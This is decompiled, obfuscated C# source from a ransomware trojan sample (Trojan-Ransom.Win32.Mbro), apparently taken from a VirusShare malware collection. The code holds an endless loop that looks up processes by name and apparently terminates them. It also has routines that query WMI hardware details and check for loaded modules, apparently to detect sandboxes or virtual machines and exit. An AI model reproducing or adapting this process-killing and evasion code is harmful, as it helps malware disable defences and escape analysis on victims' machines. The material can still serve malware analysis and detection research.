// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=2.0.0.0, Culture=neutral, PublicKeyToken=ed61553e989492b3
// MVID: A1C88199-2A68-4E4D-8A5C-4A08B8EE6E68
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Mbro.fki-bc56c8f7cfb8e35479608dd104613a06a644b4ab.exe

using \u0002;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;

namespace \u0002
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0007 \u008E;

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long \u0001([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    public static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      while (true)
      {
        Process[] processArray1 = \u0011.\u008F(\u0004.\u008E(399));
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < processArray1.Length)
        {
          Process process = processArray1[*(int*) voidPtr];
          \u0012.\u007E\u0090((object) process);
          if (true)
            *(int*) voidPtr = checked (*(int*) voidPtr + 1);
        }
        Process[] processArray2 = \u0011.\u008F(\u0004.\u008E(412));
label_5:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (true)
        {
          if (true)
          {
            if (*(int*) ((IntPtr) voidPtr + 4) < processArray2.Length)
            {
              Process process = processArray2[*(int*) ((IntPtr) voidPtr + 4)];
              \u0012.\u007E\u0090((object) process);
              *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            }
            else
              break;
          }
          else
            goto label_5;
        }
        \u0013.\u009E(600);
      }
    }

    public static void \u0002()
    {
      int num1 = \u0014.\u0001\u0002(\u0004.\u0001(), \u0004.\u008E(425), false);
      if (true)
      {
        if (num1 == 0)
        {
          \u0013.\u009F(0);
          return;
        }
        int num2 = \u0015.\u007E\u0002\u0002((object) \u0004.\u0001(), \u0004.\u008E(458)) ? 1 : 0;
        do
        {
          if (true)
          {
            if (num2 != 0)
            {
              \u0013.\u009F(0);
              return;
            }
            num2 = \u0014.\u0001\u0002(\u0004.\u0001(), \u0004.\u008E(467), false);
          }
          if (true)
          {
            int num3 = 0;
            if (num3 == 0)
            {
              if (num2 == num3)
              {
                \u0013.\u009F(0);
                if (false)
                  goto label_3;
                else
                  goto label_22;
              }
              else
              {
                int num4 = \u0014.\u0001\u0002(\u0004.\u0001(), \u0004.\u008E(504), false);
                num3 = 0;
                num2 = num4;
              }
            }
            num2 = num2 == num3 ? 1 : 0;
          }
        }
        while (false);
        goto label_17;
label_3:
        return;
label_22:
        return;
label_17:
        int num5 = \u0014.\u0001\u0002(\u0004.\u0001(), \u0004.\u008E(541), false) == 0 ? 1 : 0;
        if ((num2 | num5) != 0)
        {
          \u0013.\u009F(0);
          return;
        }
        num1 = \u0004.\u0001() ? 1 : 0;
      }
      if (num1 == 0)
        return;
      \u0013.\u009F(0);
    }

    private static string \u0001()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0004.\u008E(558), \u0004.\u008E(575));
      string str;
      if (true)
      {
        str = string.Empty;
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        try
        {
          if (true)
            objectEnumerator = \u0017.\u007E\u0004\u0002((object) \u0016.\u007E\u0003\u0002((object) managementObjectSearcher));
          while (\u0004.\u007E\u0005((object) objectEnumerator))
          {
            if (true)
            {
              ManagementObject managementObject = (ManagementObject) \u0018.\u007E\u0005\u0002((object) objectEnumerator);
              str = \u001A.\u0008\u0002(\u0008.\u0083(\u0019.\u007E\u0006\u0002((object) managementObject, \u0004.\u008E(624))));
            }
            else
              break;
          }
        }
        finally
        {
          if (objectEnumerator != null)
            \u0012.\u007E\u0091((object) objectEnumerator);
        }
      }
      return str;
    }

    private static bool \u0001()
    {
      bool flag;
      try
      {
        while (true)
        {
          string str = \u0004.\u008E(641);
          if (true)
          {
            int num;
            for (int index = \u0004.\u0001(ref str) != 0L ? 1 : 0; index == 0; index = num)
            {
              if (true)
              {
                num = 0;
                if (num == 0)
                {
                  flag = num != 0;
                  goto label_7;
                }
              }
              else
                goto label_11;
            }
            goto label_4;
          }
        }
        goto label_7;
label_4:
        if (true)
        {
          flag = true;
          goto label_11;
        }
        else
          goto label_11;
label_7:
        if (false)
          goto label_4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u001C.\u000F\u0002();
      }
label_11:
      return flag;
    }

    static \u0004() => \u0006.\u0002.\u0001(typeof (\u0004));
  }
}
